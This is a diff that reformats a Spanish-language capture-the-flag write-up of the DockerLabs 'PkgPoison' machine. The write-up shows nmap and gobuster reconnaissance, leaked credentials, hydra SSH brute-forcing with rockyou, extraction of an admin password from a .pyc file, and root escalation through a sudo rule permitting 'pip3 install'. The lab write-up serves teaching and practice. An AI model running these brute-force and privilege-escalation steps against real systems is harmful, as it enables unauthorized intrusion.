@@ -1,22 +1,30 @@
-# 🖥️ Writeup - PkgPoison 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# PkgPoison ​​
+
+## 🖥️ Writeup - PkgPoison
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Gobuster` `Information Leakage` `Hydra` `Bytecode Analysis` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip pkgpoison.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh pkgpoison.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 16:45 CET
 Nmap scan report for 172.17.0.2
@@ -83,7 +92,7 @@ Identificamos los puertos abiertos `22` (SSH) y `80` (HTTP).
 
 Accedemos a la máquina objetivo a través del puerto `80` (HTTP), pero la página no contiene ninguna información relevante.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -92,6 +101,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -124,7 +134,7 @@ Please remember to change your credentials "dev:developer123" to something stron
 I've already warned you that weak passwords can get us compromised.
 
 -Admin
-``` 
+```
 
 Este mensaje nos proporciona grandes pistas. En primer lugar, sabemos que en el sistema existen un usuario llamado `dev` y otro llamado `admin`. Por otro lado, parece que obtenemos las credenciales iniciales para el usuario `dev`.
 
@@ -136,7 +146,7 @@ ssh dev@172.17.0.2
 
 Las credenciales no han funcionado, lo que confirma que el usuario `dev` ya cambió su contraseña insegura.
 
-# HYDRA
+## HYDRA
 
 Aun así, consideramos que la nueva contraseña del usuario `dev` también podría ser débil, por lo que probamos un ataque de `fuerza bruta` dirigido contra el puerto `22`.
 
@@ -145,6 +155,7 @@ hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -156,14 +167,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-23 16:48:
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Encontramos las credenciales correctas para el usuario `dev` : `computer`.
-Accedemos a la máquina por `SSH`.
+Encontramos las credenciales correctas para el usuario `dev` : `computer`. Accedemos a la máquina por `SSH`.
 
 ```bash
 ssh dev@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`, pero no encontramos ninguna vía de escalada.
 
@@ -176,6 +186,7 @@ strings secret.cpython-38.pyc
 ```
 
 Info:
+
 ```
 adminz
 p@$$w0r8321z
@@ -200,11 +211,12 @@ Hemos pivotado con éxito al usuario `admin`.
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for admin on 200a64db404a:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -213,7 +225,7 @@ User admin may run the following commands on 200a64db404a:
     (ALL) NOPASSWD: /usr/bin/pip3 install *
 ```
 
-Descubrimos que podemos ejecutar el binario `pip3` con privilegios de `root` para instalar cualquier cosa. 
+Descubrimos que podemos ejecutar el binario `pip3` con privilegios de `root` para instalar cualquier cosa.
 
 Aprovechamos este vector de la configuración de sudo para la escalada de privilegios a `root` de la siguiente manera:
 
@@ -224,6 +236,7 @@ sudo pip3 install $TF
 ```
 
 Info:
+
 ```
 Processing /tmp/tmp.HkkQWWnrQo
 # whoami
